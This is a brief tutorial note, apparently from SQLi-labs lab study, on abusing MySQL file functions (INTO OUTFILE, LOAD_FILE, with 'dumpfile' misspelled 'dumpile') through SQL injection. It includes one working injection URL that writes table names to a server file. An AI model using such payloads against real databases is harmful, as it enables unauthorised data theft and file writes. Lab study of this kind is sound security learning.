# Exploiting databases with Outfiles

Here are some sql commands that are used to read and write files - 

1.  into outfile "name_of_the_file"

1.  into dumpile "name_of_the_file"

1.  load_file("name_of_the_file")

Also, in order to use these commands, we need to make sure that mysql has write permissions. 

MySql also has the ```--secure-file-priv``` option which limits the ability to read and write files. You may need to check which directory can mysql write to.

The url for this method will look somewhat like this - 

```
https://localhost/sqlilabs/Less-7/?id=1')) union select 1, table_name from information_schema.tables where table_schema=database(), 3 into outfile '/var/lib/mysql-files/payload3.txt' --+
```
